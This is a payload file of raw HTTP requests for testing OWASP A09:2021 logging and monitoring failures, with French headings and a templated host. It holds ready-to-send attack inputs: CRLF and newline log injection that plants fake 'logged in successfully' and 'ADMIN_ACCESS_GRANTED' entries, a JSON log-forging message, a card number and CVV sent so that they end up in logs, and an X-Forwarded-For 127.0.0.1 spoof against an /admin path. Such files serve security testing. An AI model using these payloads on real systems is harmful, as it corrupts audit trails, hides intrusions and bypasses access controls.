# OWASP Top 10 - A09:2021 Security Logging and Monitoring Failures
# Défaillances de journalisation

### Log Injection - CRLF
POST /login HTTP/1.1
Host: {{host}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

username=admin%0d%0aINFO: User admin logged in successfully

### Log Injection - Newline
GET /search?q=test%0aADMIN_ACCESS_GRANTED HTTP/1.1
Host: {{host}}

### Log Forging
POST /api/log HTTP/1.1
Host: {{host}}
Content-Type: application/json
Content-Length: 80

{"message": "User login\nINFO: Admin privileges granted to attacker"}

### Sensitive Data in Logs
POST /api/payment HTTP/1.1
Host: {{host}}
Content-Type: application/json
Content-Length: 100

{"card_number": "4532123456789012", "cvv": "123", "amount": 1000}

### Bypassing Monitoring
GET /admin HTTP/1.1
Host: {{host}}
X-Forwarded-For: 127.0.0.1
